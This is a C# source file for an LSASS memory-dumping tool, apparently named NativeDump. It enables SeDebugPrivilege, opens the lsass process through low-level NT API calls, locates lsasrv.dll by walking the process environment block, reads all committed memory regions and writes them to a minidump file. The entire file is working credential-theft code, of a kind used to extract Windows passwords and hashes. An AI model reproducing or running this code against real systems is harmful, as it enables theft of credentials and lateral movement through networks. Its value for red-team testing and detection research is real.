using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using static NativeDump.CreateFile;
//using static NativeDump.FromDisk;

namespace NativeDump
{
    internal class Program
    {
        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                int result = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (result != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. Result: " + result);
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                result = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (result != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. Result: " + result + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            // ReadProcessMemory(hProcess, mem_address, buff, buff.Length, out _);
            NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            // ReadProcessMemory(hProcess, mem_address, buff, buff.Length, out _);
            NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)
        {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_offset = 0x50;
            // If 32-bit process these offsets change
            if (IntPtr.Size == 4)
            {
                process_basic_information_size = 24;
                peb_offset = 0x4;
                ldr_offset = 0x0c;
                inInitializationOrderModuleList_offset = 0x1c;
                flink_dllbase_offset = 0x18;
                flink_buffer_offset = 0x30;
            }

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                Console.WriteLine("[+] ReturnLength: " + ReturnLength);
                Console.WriteLine("[+] Process_Basic_Information Address: \t\t0x" + pbi_addr.ToString("X"));
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            Console.WriteLine("[+] PEB Address Pointer:\t\t\t0x" + peb_pointer.ToString("X"));
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
            Console.WriteLine("[+] PEB Address:\t\t\t\t0x" + pebaddress.ToString("X"));

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            Console.WriteLine("[+] InInitializationOrderModuleList:\t\t0x" + InInitializationOrderModuleList.ToString("X"));
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset)); // Marshal.ReadIntPtr(next_flink + flink_dllbase_offset);
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset)); //Marshal.ReadIntPtr(next_flink + flink_buffer_offset);

                string base_dll_name = ReadRemoteWStr(hProcess, buffer);

                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10)); // Marshal.ReadIntPtr(next_flink + 0x10);
                
                // Compare with DLL name we are searching
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }
            return IntPtr.Zero;
        }


        static void Main(string[] args)
        {
            //PatchNtdll();

            // Get process name
            string procname = "lsass";
            
            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            Console.WriteLine("[+] Process handle: " + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] NtOpenProcess failed. Do you have enough privileges for this process?");
                Environment.Exit(0);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            byte[] memory_regions = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();

            // Get lsasrv.dll information
            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, "lsasrv.dll");
            //IntPtr lsasrvdll_address = IntPtr.Zero;
            int lsasrvdll_size = 0;
            bool bool_test = false;

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                    Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                    memory_regions = new_bytearray;

                    /*
                    // Check if lsasrv.dll
                    char[] moduleName = new char[1024];
                    GetModuleBaseName(processHandle, mbi.AllocationBase, moduleName, (uint)moduleName.Length);
                    string str = new string(moduleName);
                    if (str.Contains("lsasrv")) {
                        if (mbi.AllocationBase == mbi.BaseAddress) { 
                            lsasrvdll_address = mbi.BaseAddress;
                        }
                        lsasrvdll_size += (int)mbi.RegionSize;
                    }
                    */

                    // Calculate size of lsasrv.dll region
                    if (mbi.BaseAddress == lsasrvdll_address)
                    {
                        bool_test = true;
                    }
                    if (bool_test == true)
                    {
                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
                        {
                            bool_test = false;
                        }
                        else
                        {
                            lsasrvdll_size += (int)mbi.RegionSize;
                        }
                    }
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            // Get file name
            string dumpfile = "proc_" + processPID + ".dmp";
            if (args.Length > 0)
            {
                dumpfile = args[0];
            }

            // Generate Minidump file
            Console.WriteLine("[+] Lsasrv.dll Address:\t0x" + lsasrvdll_address.ToString("X"));
            Console.WriteLine("[+] Lsasrv.dll Size:   \t0x" + lsasrvdll_size.ToString("X"));
            CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions, dumpfile);

            // Close process handle
            NtClose(processHandle);
        }
    }
}